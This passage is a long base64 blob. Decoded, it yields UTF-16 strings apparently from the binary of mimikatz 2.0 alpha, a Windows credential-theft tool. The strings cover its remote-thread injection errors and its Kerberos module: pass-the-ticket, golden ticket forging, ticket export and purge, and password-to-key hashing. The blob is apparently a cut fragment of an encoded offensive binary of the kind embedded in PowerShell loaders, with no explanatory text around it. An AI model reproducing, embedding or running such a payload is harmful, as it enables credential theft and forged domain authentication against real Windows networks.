ByAGUAYQB0AGUAIAA7ACAAUgB0AGwAQwByAGUAYQB0AGUAVQBzAGUAcgBUAGgAcgBlAGEAZAAgACgAMAB4ACUAMAA4AHgAKQAKAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBsAGwAXwBtAF8AcgBlAG0AbwB0AGUAbABpAGIAXwBjAHIAZQBhAHQAZQAgADsAIABDAHIAZQBhAHQAZQBSAGUAbQBvAHQAZQBUAGgAcgBlAGEAZAAgACgAMAB4ACUAMAA4AHgAKQAKAAAAAABUAGgAIABAACAAJQBwAAoARABhACAAQAAgACUAcAAKAAAAAABFAFIAUgBPAFIAIABrAHUAbABsAF8AbQBfAHIAZQBtAG8AdABlAGwAaQBiAF8AYwByAGUAYQB0AGUAIAA7ACAAawB1AGwAbABfAG0AXwBrAGUAcgBuAGUAbABfAGkAbwBjAHQAbABfAGgAYQBuAGQAbABlACAAKAAwAHgAJQAwADgAeAApAAoAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAbABsAF8AbQBfAHIAZQBtAG8AdABlAGwAaQBiAF8AQwByAGUAYQB0AGUAUgBlAG0AbwB0AGUAQwBvAGQAZQBXAGkAdAB0AGgAUABhAHQAdABlAHIAbgBSAGUAcABsAGEAYwBlACAAOwAgAGsAdQBsAGwAXwBtAF8AbQBlAG0AbwByAHkAXwBjAG8AcAB5ACAAKAAwAHgAJQAwADgAeAApAAoAAAAAAAAARQBSAFIATwBSACAAawB1AGwAbABfAG0AXwByAGUAbQBvAHQAZQBsAGkAYgBfAEMAcgBlAGEAdABlAFIAZQBtAG8AdABlAEMAbwBkAGUAVwBpAHQAdABoAFAAYQB0AHQAZQByAG4AUgBlAHAAbABhAGMAZQAgADsAIABrAHUAbABsAF8AbQBfAG0AZQBtAG8AcgB5AF8AYQBsAGwAbwBjACAALwAgAFYAaQByAHQAdQBhAGwAQQBsAGwAbwBjACgARQB4ACkAIAAoADAAeAAlADAAOAB4ACkACgAAAAAAAABFAFIAUgBPAFIAIABrAHUAbABsAF8AbQBfAHIAZQBtAG8AdABlAGwAaQBiAF8AQwByAGUAYQB0AGUAUgBlAG0AbwB0AGUAQwBvAGQAZQBXAGkAdAB0AGgAUABhAHQAdABlAHIAbgBSAGUAcABsAGEAYwBlACAAOwAgAE4AbwAgAGIAdQBmAGYAZQByACAAPwAKAAAAUwBlAHIAdgBpAGMAZQBzAEEAYwB0AGkAdgBlAAAAAABcAHgAJQAwADIAeAAAAAAAMAB4ACUAMAAyAHgALAAgAAAAAAAlADAAMgB4ACAAAAAlADAAMgB4AAAAAAAKAAAAJQBzACAAAAAlAHMAAAAAACUAdwBaAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBsAGwAXwBtAF8AcwB0AHIAaQBuAGcAXwBkAGkAcwBwAGwAYQB5AFMASQBEACAAOwAgAEMAbwBuAHYAZQByAHQAUwBpAGQAVABvAFMAdAByAGkAbgBnAFMAaQBkACAAKAAwAHgAJQAwADgAeAApAAoAAAAAAFQAbwBrAGUAbgAAAAoAIAAgAC4AIwAjACMAIwAjAC4AIAAgACAAbQBpAG0AaQBrAGEAdAB6ACAAMgAuADAAIABhAGwAcABoAGEAIAAoAHgAOAA2ACkAIAByAGUAbABlAGEAcwBlACAAIgBLAGkAdwBpACAAZQBuACAAQwAiACAAKABGAGUAYgAgADEANgAgADIAMAAxADUAIAAyADIAOgAxADcAOgA1ADIAKQAKACAALgAjACMAIABeACAAIwAjAC4AIAAgAAoAIAAjACMAIAAvACAAXAAgACMAIwAgACAALwAqACAAKgAgACoACgAgACMAIwAgAFwAIAAvACAAIwAjACAAIAAgAEIAZQBuAGoAYQBtAGkAbgAgAEQARQBMAFAAWQAgAGAAZwBlAG4AdABpAGwAawBpAHcAaQBgACAAKAAgAGIAZQBuAGoAYQBtAGkAbgBAAGcAZQBuAHQAaQBsAGsAaQB3AGkALgBjAG8AbQAgACkACgAgACcAIwAjACAAdgAgACMAIwAnACAAIAAgAGgAdAB0AHAAOgAvAC8AYgBsAG8AZwAuAGcAZQBuAHQAaQBsAGsAaQB3AGkALgBjAG8AbQAvAG0AaQBtAGkAawBhAHQAegAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACgAbwBlAC4AZQBvACkACgAgACAAJwAjACMAIwAjACMAJwAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHcAaQB0AGgAIAAlADIAdQAgAG0AbwBkAHUAbABlAHMAIAAqACAAKgAgACoALwAKAAoAAAAAAAoAbQBpAG0AaQBrAGEAdAB6ACgAcABvAHcAZQByAHMAaABlAGwAbAApACAAIwAgACUAcwAKAAAASQBOAEkAVAAAAAAAQwBMAEUAQQBOAAAAPgA+AD4AIAAlAHMAIABvAGYAIAAnACUAcwAnACAAbQBvAGQAdQBsAGUAIABmAGEAaQBsAGUAZAAgADoAIAAlADAAOAB4AAoAAAAAADoAOgAAAAAAAAAAAEUAUgBSAE8AUgAgAG0AaQBtAGkAawBhAHQAegBfAGQAbwBMAG8AYwBhAGwAIAA7ACAAIgAlAHMAIgAgAG0AbwBkAHUAbABlACAAbgBvAHQAIABmAG8AdQBuAGQAIAAhAAoAAAAKACUAMQA2AHMAAAAgACAALQAgACAAJQBzAAAAIAAgAFsAJQBzAF0AAAAAAEUAUgBSAE8AUgAgAG0AaQBtAGkAawBhAHQAegBfAGQAbwBMAG8AYwBhAGwAIAA7ACAAIgAlAHMAIgAgAGMAbwBtAG0AYQBuAGQAIABvAGYAIAAiACUAcwAiACAAbQBvAGQAdQBsAGUAIABuAG8AdAAgAGYAbwB1AG4AZAAgACEACgAAAAoATQBvAGQAdQBsAGUAIAA6AAkAJQBzAAAAAAAKAEYAdQBsAGwAIABuAGEAbQBlACAAOgAJACUAcwAAAAoARABlAHMAYwByAGkAcAB0AGkAbwBuACAAOgAJACUAcwAAAEtlcmJlcm9zAAAAAHUAcwBlAHIAAAAAAHMAZQByAHYAaQBjAGUAAAAAAAAATABpAHMAdAAgAHQAaQBjAGsAZQB0AHMAIABpAG4AIABNAEkAVAAvAEgAZQBpAG0AZABhAGwAbAAgAGMAYwBhAGMAaABlAAAAYwBsAGkAcwB0AAAAUABhAHMAcwAtAHQAaABlAC0AYwBjAGEAYwBoAGUAIABbAE4AVAA2AF0AAABwAHQAYwAAAEgAYQBzAGgAIABwAGEAcwBzAHcAbwByAGQAIAB0AG8AIABrAGUAeQBzAAAAaABhAHMAaAAAAAAAVwBpAGwAbAB5ACAAVwBvAG4AawBhACAAZgBhAGMAdABvAHIAeQAAAGcAbwBsAGQAZQBuAAAAAABQAHUAcgBnAGUAIAB0AGkAYwBrAGUAdAAoAHMAKQAAAHAAdQByAGcAZQAAAFIAZQB0AHIAaQBlAHYAZQAgAGMAdQByAHIAZQBuAHQAIABUAEcAVAAAAAAAdABnAHQAAABMAGkAcwB0ACAAdABpAGMAawBlAHQAKABzACkAAAAAAGwAaQBzAHQAAAAAAFAAYQBzAHMALQB0AGgAZQAtAHQAaQBjAGsAZQB0ACAAWwBOAFQAIAA2AF0AAAAAAHAAdAB0AAAAAAAAAEsAZQByAGIAZQByAG8AcwAgAHAAYQBjAGsAYQBnAGUAIABtAG8AZAB1AGwAZQAAAGsAZQByAGIAZQByAG8AcwAAAAAAAAAAACUAMwB1ACAALQAgAEQAaQByAGUAYwB0AG8AcgB5ACAAJwAlAHMAJwAgACgAKgAuAGsAaQByAGIAaQApAAoAAABcACoALgBrAGkAcgBiAGkAAAAAAFwAAAAgACAAIAAlADMAdQAgAC0AIABGAGkAbABlACAAJwAlAHMAJwAgADoAIAAAACUAMwB1ACAALQAgAEYAaQBsAGUAIAAnACUAcwAnACAAOgAgAAAAAABPAEsACgAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGsAZQByAGIAZQByAG8AcwBfAHAAdAB0AF8AZgBpAGwAZQAgADsAIABMAHMAYQBDAGEAbABsAEsAZQByAGIAZQByAG8AcwBQAGEAYwBrAGEAZwBlACAAJQAwADgAeAAKAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AawBlAHIAYgBlAHIAbwBzAF8AcAB0AHQAXwBmAGkAbABlACAAOwAgAGsAdQBsAGwAXwBtAF8AZgBpAGwAZQBfAHIAZQBhAGQARABhAHQAYQAgACgAMAB4ACUAMAA4AHgAKQAKAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBrAGUAcgBiAGUAcgBvAHMAXwBwAHQAdABfAGQAYQB0AGEAIAA7ACAATABzAGEAQwBhAGwAbABBAHUAdABoAGUAbgB0AGkAYwBhAHQAaQBvAG4AUABhAGMAawBhAGcAZQAgAEsAZQByAGIAUwB1AGIAbQBpAHQAVABpAGMAawBlAHQATQBlAHMAcwBhAGcAZQAgAC8AIABQAGEAYwBrAGEAZwBlACAAOgAgACUAMAA4AHgACgAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AawBlAHIAYgBlAHIAbwBzAF8AcAB0AHQAXwBkAGEAdABhACAAOwAgAEwAcwBhAEMAYQBsAGwAQQB1AHQAaABlAG4AdABpAGMAYQB0AGkAbwBuAFAAYQBjAGsAYQBnAGUAIABLAGUAcgBiAFMAdQBiAG0AaQB0AFQAaQBjAGsAZQB0AE0AZQBzAHMAYQBnAGUAIAA6ACAAJQAwADgAeAAKAAAAAAAAAFQAaQBjAGsAZQB0ACgAcwApACAAcAB1AHIAZwBlACAAZgBvAHIAIABjAHUAcgByAGUAbgB0ACAAcwBlAHMAcwBpAG8AbgAgAGkAcwAgAE8ASwAKAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGsAZQByAGIAZQByAG8AcwBfAHAAdQByAGcAZQAgADsAIABMAHMAYQBDAGEAbABsAEEAdQB0AGgAZQBuAHQAaQBjAGEAdABpAG8AbgBQAGEAYwBrAGEAZwBlACAASwBlAHIAYgBQAHUAcgBnAGUAVABpAGMAawBlAHQAQwBhAGMAaABlAE0AZQBzAHMAYQBnAGUAIAAvACAAUABhAGMAawBhAGcAZQAgADoAIAAlADAAOAB4AAoAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGsAZQByAGIAZQByAG8AcwBfAHAAdQByAGcAZQAgADsAIABMAHMAYQBDAGEAbABsAEEAdQB0AGgAZQBuAHQAaQBjAGEAdABpAG8AbgBQAGEAYwBrAGEAZwBlACAASwBlAHIAYgBQAHUAcgBnAGUAVABpAGMAawBlAHQAQwBhAGMAaABlAE0AZQBzAHMAYQBnAGUAIAA6ACAAJQAwADgAeAAKAAAAAABLAGUAcgBiAGUAcgBvAHMAIABUAEcAVAAgAG8AZgAgAGMAdQByAHIAZQBuAHQAIABzAGUAcwBzAGkAbwBuACAAOgAgAAAAAAAKAAoACQAqACoAIABTAGUAcwBzAGkAbwBuACAAawBlAHkAIABpAHMAIABOAFUATABMACEAIABJAHQAIABtAGUAYQBuAHMAIABhAGwAbABvAHcAdABnAHQAcwBlAHMAcwBpAG8AbgBrAGUAeQAgAGkAcwAgAG4AbwB0ACAAcwBlAHQAIAB0AG8AIAAxACAAKgAqAAoAAAAAAG4AbwAgAHQAaQBjAGsAZQB0ACAAIQAKAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBrAGUAcgBiAGUAcgBvAHMAXwB0AGcAdAAgADsAIABMAHMAYQBDAGEAbABsAEEAdQB0AGgAZQBuAHQAaQBjAGEAdABpAG8AbgBQAGEAYwBrAGEAZwBlACAASwBlAHIAYgBSAGUAdAByAGkAZQB2AGUAVABpAGMAawBlAHQATQBlAHMAcwBhAGcAZQAgAC8AIABQAGEAYwBrAGEAZwBlACAAOgAgACUAMAA4AHgACgAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AawBlAHIAYgBlAHIAbwBzAF8AdABnAHQAIAA7ACAATABzAGEAQwBhAGwAbABBAHUAdABoAGUAbgB0AGkAYwBhAHQAaQBvAG4AUABhAGMAawBhAGcAZQAgAEsAZQByAGIAUgBlAHQAcgBpAGUAdgBlAFQAaQBjAGsAZQB0AE0AZQBzAHMAYQBnAGUAIAA6ACAAJQAwADgAeAAKAAAAAABlAHgAcABvAHIAdAAAAAAACgBbACUAMAA4AHgAXQAgAC0AIAAwAHgAJQAwADgAeAAgAC0AIAAlAHMAAAAKACAAIAAgAFMAdABhAHIAdAAvAEUAbgBkAC8ATQBhAHgAUgBlAG4AZQB3ADoAIAAAAAAAIAA7ACAAAAAKACAAIAAgAFMAZQByAHYAZQByACAATgBhAG0AZQAgACAAIAAgACAAIAAgADoAIAAlAHcAWgAgAEAAIAAlAHcAWgAAAAAAAAAKACAAIAAgAEMAbABpAGUAbgB0ACAATgBhAG0AZQAgACAAIAAgACAAIAAgADoAIAAlAHcAWgAgAEAAIAAlAHcAWgAAAAoAIAAgACAARgBsAGEAZwBzACAAJQAwADgAeAAgACAAIAAgADoAIAAAAAAAawBpAHIAYgBpAAAACgAgACAAIAAqACAAUwBhAHYAZQBkACAAdABvACAAZgBpAGwAZQAgACAAIAAgACAAOgAgACUAcwAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBrAGUAcgBiAGUAcgBvAHMAXwBsAGkAcwB0ACAAOwAgAEwAcwBhAEMAYQBsAGwAQQB1AHQAaABlAG4AdABpAGMAYQB0AGkAbwBuAFAAYQBjAGsAYQBnAGUAIABLAGUAcgBiAFIAZQB0AHIAaQBlAHYAZQBFAG4AYwBvAGQAZQBkAFQAaQBjAGsAZQB0AE0AZQBzAHMAYQBnAGUAIAAvACAAUABhAGMAawBhAGcAZQAgADoAIAAlADAAOAB4AAoAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGsAZQByAGIAZQByAG8AcwBfAGwAaQBzAHQAIAA7ACAATABzAGEAQwBhAGwAbABBAHUAdABoAGUAbgB0AGkAYwBhAHQAaQBvAG4AUABhAGMAawBhAGcAZQAgAEsAZQByAGIAUgBlAHQAcgBpAGUAdgBlAEUAbgBjAG8AZABlAGQAVABpAGMAawBlAHQATQBlAHMAcwBhAGcAZQAgADoAIAAlADAAOAB4AAoAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AawBlAHIAYgBlAHIAbwBzAF8AbABpAHMAdAAgADsAIABMAHMAYQBDAGEAbABsAEEAdQB0AGgAZQBuAHQAaQBjAGEAdABpAG8AbgBQAGEAYwBrAGEAZwBlACAASwBlAHIAYgBRAHUAZQByAHkAVABpAGMAawBlAHQAQwBhAGMAaABlAEUAeAAyAE0AZQBzAHMAYQBnAGUAIAAvACAAUABhAGMAawBhAGcAZQAgADoAIAAlADAAOAB4AAoAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AawBlAHIAYgBlAHIAbwBzAF8AbABpAHMAdAAgADsAIABMAHMAYQBDAGEAbABsAEEAdQB0AGgAZQBuAHQAaQBjAGEAdABpAG8AbgBQAGEAYwBrAGEAZwBlACAASwBlAHIAYgBRAHUAZQByAHkAVABpAGMAawBlAHQAQwBhAGMAaABlAEUAeAAyAE0AZQBzAHMAYQBnAGUAIAA6ACAAJQAwADgAeAAKAAAAAAAlAHUALQAlADAAOAB4AC0AJQB3AFoAQAAlAHcAWgAtACUAdwBaAC4AJQBzAAAAAAB0AGkAYwBrAGUAdAAuAGsAaQByAGIAaQAAAAAAdABpAGMAawBlAHQAAAAAAGEAZABtAGkAbgAAAGQAbwBtAGEAaQBuAAAAAABzAGkAZAAAAGQAZQBzAAAAcgBjADQAAABrAHIAYgB0AGcAdAAAAAAAYQBlAHMAMQAyADgAAAAAAGEAZQBzADIANQA2AAAAAAB0AGEAcgBnAGUAdAAAAAAAaQBkAAAAAABnAHIAbwB1AHAAcwAAAAAAMAAAAHMAdABhAHIAdABvAGYAZgBzAGUAdAAAADUAMgA1ADYAMAAwADAAAABlAG4AZABpAG4AAAByAGUAbgBlAHcAbQBhAHgAAAAAAFUAcwBlAHIAIAAgACAAIAAgACAAOgAgACUAcwAKAEQAbwBtAGEAaQBuACAAIAAgACAAOgAgACUAcwAKAFMASQBEACAAIAAgACAAIAAgACAAOgAgACUAcwAKAFUAcwBlAHIAIABJAGQAIAAgACAAOgAgACUAdQAKAAAAAABHAHIAbwB1AHAAcwAgAEkAZAAgADoAIAAqAAAAJQB1ACAAAAAKAFMAZQByAHYAaQBjAGUASwBlAHkAOgAgAAAAIAAtACAAJQBzAAoAAAAAAFMAZQByAHYAaQBjAGUAIAAgACAAOgAgACUAcwAKAAAAVABhAHIAZwBlAHQAIAAgACAAIAA6ACAAJQBzAAoAAABMAGkAZgBlAHQAaQBtAGUAIAAgADoAIAAAAAAAKgAqACAAUABhAHMAcwAgAFQAaABlACAAVABpAGMAawBlAHQAIAAqACoAAAAtAD4AIABUAGkAYwBrAGUAdAAgADoAIAAlAHMACgAKAAAAAAAKAEcAbwBsAGQAZQBuACAAdABpAGMAawBlAHQAIABmAG8AcgAgACcAJQBzACAAQAAgACUAcwAnACAAcwB1AGMAYwBlAHMAcwBmAHUAbABsAHkAIABzAHUAYgBtAGkAdAB0AGUAZAAgAGYAbwByACAAYwB1AHIAcgBlAG4AdAAgAHMAZQBzAHMAaQBvAG4ACgAAAAAACgBGAGkAbgBhAGwAIABUAGkAYwBrAGUAdAAgAFMAYQB2AGUAZAAgAHQAbwAgAGYAaQBsAGUAIAAhAAoAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGsAZQByAGIAZQByAG8AcwBfAGcAbwBsAGQAZQBuACAAOwAgAAoAawB1AGwAbABfAG0AXwBmAGkAbABlAF8AdwByAGkAdABlAEQAYQB0AGEAIAAoADAAeAAlADAAOAB4ACkACgAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AawBlAHIAYgBlAHIAbwBzAF8AZwBvAGwAZABlAG4AIAA7ACAASwByAGIAQwByAGUAZAAgAGUAcgByAG8AcgAKAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AawBlAHIAYgBlAHIAbwBzAF8AZwBvAGwAZABlAG4AIAA7ACAASwByAGIAdABnAHQAIABrAGUAeQAgAHMAaQB6AGUAIABsAGUAbgBnAHQAaAAgAG0AdQBzAHQAIABiAGUAIAAlAHUAIAAoACUAdQAgAGIAeQB0AGUAcwApACAAZgBvAHIAIAAlAHMACgAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AawBlAHIAYgBlAHIAbwBzAF8AZwBvAGwAZABlAG4AIAA7ACAAVQBuAGEAYgBsAGUAIAB0AG8AIABsAG8AYwBhAHQAZQAgAEMAcgB5AHAAdABvAFMAeQBzAHQAZQBtACAAZgBvAHIAIABFAFQAWQBQAEUAIAAlAHUAIAAoAGUAcgByAG8AcgAgADAAeAAlADAAOAB4ACkAIAAtACAAQQBFAFMAIABvAG4AbAB5ACAAYQB2AGEAaQBsAGEAYgBsAGUAIABvAG4AIABOAFQANgAKAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AawBlAHIAYgBlAHIAbwBzAF8AZwBvAGwAZABlAG4AIAA7ACAATQBpAHMAcwBpAG4AZwAgAGsAcgBiAHQAZwB0ACAAawBlAHkAIABhAHIAZwB1AG0AZQBuAHQAIAAoAC8AcgBjADQAIABvAHIAIAAvAGEAZQBzADEAMgA4ACAAbwByACAALwBhAGUAcwAyADUANgApAAoAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGsAZQByAGIAZQByAG8AcwBfAGcAbwBsAGQAZQBuACAAOwAgAFMASQBEACAAcwBlAGUAbQBzACAAaQBuAHYAYQBsAGkAZAAgAC0AIABDAG8AbgB2AGUAcgB0AFMAdAByAGkAbgBnAFMAaQBkAFQAbwBTAGkAZAAgACgAMAB4ACUAMAA4AHgAKQAKAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGsAZQByAGIAZQByAG8AcwBfAGcAbwBsAGQAZQBuACAAOwAgAE0AaQBzAHMAaQBuAGcAIABTAEkARAAgAGEAcgBnAHUAbQBlAG4AdAAKAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBrAGUAcgBiAGUAcgBvAHMAXwBnAG8AbABkAGUAbgAgADsAIABNAGkAcwBzAGkAbgBnACAAZABvAG0AYQBpAG4AIABhAHIAZwB1AG0AZQBuAHQACgAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AawBlAHIAYgBlAHIAbwBzAF8AZwBvAGwAZABlAG4AIAA7ACAATQBpAHMAcwBpAG4AZwAgAHUAcwBlAHIAIABhAHIAZwB1AG0AZQBuAHQACgAAACAAKgAgAFAAQQBDACAAZwBlAG4AZQByAGEAdABlAGQACgAAACAAKgAgAFAAQQBDACAAcwBpAGcAbgBlAGQACgAAAAAAIAAqACAARQBuAGMAVABpAGMAawBlAHQAUABhAHIAdAAgAGcAZQBuAGUAcgBhAHQAZQBkAAoAAAAgACoAIABFAG4AYwBUAGkAYwBrAGUAdABQAGEAcgB0ACAAZQBuAGMAcgB5AHAAdABlAGQACgAAACAAKgAgAEsAcgBiAEMAcgBlAGQAIABnAGUAbgBlAHIAYQB0AGUAZAAKAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AawBlAHIAYgBlAHIAbwBzAF8AZwBvAGwAZABlAG4AXwBkAGEAdABhACAAOwAgAGsAdQBoAGwAXwBtAF8AawBlAHIAYgBlAHIAbwBzAF8AZQBuAGMAcgB5AHAAdAAgACUAMAA4AHgACgAAAHAAYQBzAHMAdwBvAHIAZAAAAAAAYwBvAHUAbgB0AAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AawBlAHIAYgBlAHIAbwBzAF8AaABhAHMAaAAgADsAIABIAGEAcwBoAFAAYQBzAHMAdwBvAHIAZAAgADoAIAAlADAAOAB4AAoAAABYAC0AQwBBAEMASABFAEMATwBOAEYAOgAAAAAACgBQAHIAaQBuAGMAaQBwAGEAbAAgADoAIAAAAAoACgBEAGEAdABhACAAJQB1AAAACgAJACAAIAAgACoAIABJAG4AagBlAGMAdABpAG4AZwAgAHQAaQBjAGsAZQB0ACAAOgAgAAAAAAAKAAkAIAAgACAAKgAgAFMAYQB2AGUAZAAgAHQAbwAgAGYAaQBsAGUAIAAlAHMAIAAhAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AawBlAHIAYgBlAHIAbwBzAF8AYwBjAGEAYwBoAGUAXwBlAG4AdQBtACAAOwAgAGsAdQBsAGwAXwBtAF8AZgBpAGwAZQBfAHcAcgBpAHQAZQBEAGEAdABhACAAKAAwAHgAJQAwADgAeAApAAoAAAAKAAkAKgAgACUAdwBaACAAZQBuAHQAcgB5AD8AIAAqAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBrAGUAcgBiAGUAcgBvAHMAXwBjAGMAYQBjAGgAZQBfAGUAbgB1AG0AIAA7ACAAYwBjAGEAYwBoAGUAIAB2AGUAcgBzAGkAbwBuACAAIQA9ACAAMAB4ADAANQAwADQACgAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGsAZQByAGIAZQByAG8AcwBfAGMAYwBhAGMAaABlAF8AZQBuAHUAbQAgADsAIABrAHUAbABsAF8AbQBfAGYAaQBsAGUAXwByAGUAYQBkAEQAYQB0AGEAIAAoADAAeAAlADAAOAB4ACkACgAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBrAGUAcgBiAGUAcgBvAHMAXwBjAGMAYQBjAGgAZQBfAGUAbgB1AG0AIAA7ACAAQQB0ACAAbABlAGEAcwB0ACAAbwBuAGUAIABmAGkAbABlAG4AYQBtAGUAIABpAHMAIABuAGUAZQBkAGUAZAAKAAAAAAAlAHUALQAlADAAOAB4AC4AJQBzAAAAAAByAGUAcwBlAHIAdgBlAGQAAAAAAGYAbwByAHcAYQByAGQAYQBiAGwAZQAAAGYAbwByAHcAYQByAGQAZQBkAAAAcAByAG8AeABpAGEAYgBsAGUAAABwAHIAbwB4AHkAAABtAGEAeQBfAHAAbwBzAHQAZABhAHQAZQAAAAAAcABvAHMAdABkAGEAdABlAGQAAABpAG4AdgBhAGwAaQBkAAAAcgBlAG4AZQB3AGEAYgBsAGUAAABpAG4AaQB0AGkAYQBsAAAAcAByAGUAXwBhAHUAdABoAGUAbgB0AAAAaAB3AF8AYQB1AHQAaABlAG4AdAAAAAAAbwBrAF8AYQBzAF8AZABlAGwAZQBnAGEAdABlAAAAAAA/AAAAbgBhAG0AZQBfAGMAYQBuAG8AbgBpAGMAYQBsAGkAegBlAAAACgAJACAAIAAgAFMAdABhAHIAdAAvAEUAbgBkAC8ATQBhAHgAUgBlAG4AZQB3ADoAIAAAAAoACQAgACAAIABTAGUAcgB2AGkAYwBlACAATgBhAG0AZQAgAAAAAAAKAAkAIAAgACAAVABhAHIAZwBlAHQAIABOAGEAbQBlACAAIAAAAAAACgAJACAAIAAgAEMAbABpAGUAbgB0ACAATgBhAG0AZQAgACAAAAAAACAAKAAgACUAdwBaACAAKQAAAAAACgAJACAAIAAgAEYAbABhAGcAcwAgACUAMAA4AHgAIAAgACAAIAA6ACAAAAAAAAAACgAJACAAIAAgAFMAZQBzAHMAaQBvAG4AIABLAGUAeQAgACAAIAAgACAAIAAgADoAIAAwAHgAJQAwADgAeAAgAC0AIAAlAHMAAAAAAAoACQAgACAAIAAgACAAAAAAAAAACgAJACAAIAAgAFQAaQBjAGsAZQB0ACAAIAAgACAAIAAgACAAIAAgACAAIAAgADoAIAAwAHgAJQAwADgAeAAgAC0AIAAlAHMAIAA7ACAAawB2AG4AbwAgAD0AIAAlAHUAAAAAAAkAWwAuAC4ALgBdAAAAAAAlAHMAIAA7ACAAAAAoACUAMAAyAGgAdQApACAAOgAgAAAAAAAlAHcAWgAgADsAIAAAAAAAKAAtAC0AKQAgADoAIAAAAEAAIAAlAHcAWgAAAG4AdQBsAGwAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAAAGQAZQBzAF8AcABsAGEAaQBuACAAIAAgACAAIAAgACAAIAAAAGQAZQBzAF8AYwBiAGMAXwBjAHIAYwAgACAAIAAgACAAIAAAAGQAZQBzAF8AYwBiAGMAXwBtAGQANAAgACAAIAAgACAAIAAAAGQAZQBzAF8AYwBiAGMAXwBtAGQANQAgACAAIAAgACAAIAAAAGQAZQBzAF8AYwBiAGMAXwBtAGQANQBfAG4AdAAgACAAIAAAAHIAYwA0AF8AcABsAGEAaQBuACAAIAAgACAAIAAgACAAIAAAAHIAYwA0AF8AcABsAGEAaQBuADIAIAAgACAAIAAgACAAIAAAAHIAYwA0AF8AcABsAGEAaQBuAF8AZQB4AHAAIAAgACAAIAAAAHIAYwA0AF8AbABtACAAIAAgACAAIAAgACAAIAAgACAAIAAAAHIAYwA0AF8AbQBkADQAIAAgACAAIAAgACAAIAAgACAAIAAAAHIAYwA0AF8AcwBoAGEAIAAgACAAIAAgACAAIAAgACAAIAAAAHIAYwA0AF8AaABtAGEAYwBfAG4AdAAgACAAIAAgACAAIAAAAHIAYwA0AF8AaABtAGEAYwBfAG4AdABfAGUAeABwACAAIAAAAHIAYwA0AF8AcABsAGEAaQBuAF8AbwBsAGQAIAAgACAAIAAAAHIAYwA0AF8AcABsAGEAaQBuAF8AbwBsAGQAXwBlAHgAcAAAAHIAYwA0AF8AaABtAGEAYwBfAG8AbABkACAAIAAgACAAIAAAAHIAYwA0AF8AaABtAGEAYwBfAG8AbABkAF8AZQB4AHAAIAAAAGEAZQBzADEAMgA4AF8AaABtAGEAYwBfAHAAbABhAGkAbgAAAGEAZQBzADIANQA2AF8AaABtAGEAYwBfAHAAbABhAGkAbgAAAGEAZQBzADEAMgA4AF8AaABtAGEAYwAgACAAIAAgACAAIAAAAGEAZQBzADIANQA2AF8AaABtAGEAYwAgACAAIAAgACAAIAAAAHUAbgBrAG4AbwB3ACAAIAAgACAAIAAgACAAIAAgACAAIAAAAFAAUgBPAFYAXwBSAFMAQQBfAEEARQBTAAAAAABQAFIATwBWAF8AUgBFAFAATABBAEMARQBfAE8AVwBGAAAAAABQAFIATwBWAF8ASQBOAFQARQBMAF8AUwBFAEMAAAAAAFAAUgBPAFYAXwBSAE4ARwAAAAAAUABSAE8AVgBfAFMAUABZAFIAVQBTAF8ATABZAE4ASwBTAAAAUABSAE8AVgBfAEQASABfAFMAQwBIAEEATgBOAEUATAAAAAAAUABSAE8AVgBfAEUAQwBfAEUAQwBOAFIAQQBfAEYAVQBMAEwAAAAAAFAAUgBPAFYAXwBFAEMAXwBFAEMARABTAEEAXwBGAFUATABMAAAAAABQAFIATwBWAF8ARQBDAF8ARQBDAE4AUgBBAF8AUwBJAEcAAABQAFIATwBWAF8ARQBDAF8ARQBDAEQAUwBBAF8AUwBJAEcAAABQAFIATwBWAF8ARABTAFMAXwBEAEgAAABQAFIATwBWAF8AUgBTAEEAXwBTAEMASABBAE4ATgBFAEwAAABQAFIATwBWAF8AUwBTAEwAAAAAAFAAUgBPAFYAXwBNAFMAXwBFAFgAQwBIAEEATgBHAEUAAAAAAFAAUgBPAFYAXwBGAE8AUgBUAEUAWgBaAEEAAABQAFIATwBWAF8ARABTAFMAAAAAAFAAUgBPAFYAXwBSAFMAQQBfAFMASQBHAAAAAABQAFIATwBWAF8AUgBTAEEAXwBGAFUATABMAAAATQBpAGMAcgBvAHMAbwBmAHQAIABFAG4AaABhAG4AYwBlAGQAIABSAFMAQQAgAGEAbgBkACAAQQBFAFMA